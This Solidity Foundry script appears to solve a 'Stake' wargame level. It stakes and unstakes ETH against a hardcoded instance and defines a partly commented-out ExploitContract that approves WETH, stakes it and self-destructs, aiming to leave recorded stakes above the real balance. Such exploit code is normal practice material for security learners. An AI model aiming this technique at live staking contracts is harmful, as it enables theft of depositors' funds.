// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "../lib/forge-std/src/console.sol"; // For logging in Foundry
import "../lib/forge-std/src/Script.sol"; // Foundry script utilities
import "../src/Stake.sol";  // Import the Stake contract
import "../lib/openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";
import "../lib/openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";

// The main script that will deploy and exploit the Stake contract
contract StakeSolution is Script {

    address payable public stakeInstance = payable(0xC42B32ba4436BE09101852fAC8EA81273eAc7d21); // Replace with actual instance
    bytes payload_1 = abi.encodeWithSignature("StakeETH()");
    bytes payload_2 = abi.encodeWithSignature("Unstake(uint256)",0.002 ether);

    ExploitContract attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));  // Start broadcasting with private key

        // Deploy a fake WETH contract and the attack contract
        // wethContract = new FakeWETH();
        address wethContract = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;
        

        // Call the attacker contract's logic to drain funds
        

        // Stake ETH and WETH through the normal and fake flow
        (bool success_1,)=stakeInstance.call{value:0.02 ether}(payload_1);
        require(success_1,"failed One");
        (bool success_2,)=stakeInstance.call(payload_2);
        require(success_2,"failed two");

        // attacker = new ExploitContract(stakeInstance, wethContract);
        // attacker.deposit{value: 0.002 ether}();
        // attacker.stakeWETH();
        // attacker.drain();

        vm.stopBroadcast();  // Stop broadcasting
    }
}
// assert(address(stake).balance>0);
// assert(stake.totalStaked()>address(stake).balance);
// assert(stake.Stakers(player)==true);
// assert(stake.UserStake(player)==0);

// The contract that interacts with the Stake contract to exploit it
contract ExploitContract {
    address payable public stake;
    address public weth;
    Stake public stakeContract;
    bytes payload = abi.encodeWithSignature("approve(address,uint256)",stake,0.002 ether);


    constructor(address _stake, address _weth) {
        stake = payable(_stake);
        weth = _weth;
        stakeContract = Stake(_stake);
    }

    function deposit() public payable returns (bool) {
        return true; // Mock deposit function
    }

    function drain() public {
        selfdestruct(stake); // Destroy contract and transfer balance to Stake contract
    }

    function stakeWETH() public {
        (bool success,)=weth.call(payload); // Approve WETH transfer
        require(success,"approving failed");
        stakeContract.StakeWETH(0.002 ether); // Stake WETH in Stake contract
    }

    receive() external payable {
        // Receive fallback function to accept ether
    }
}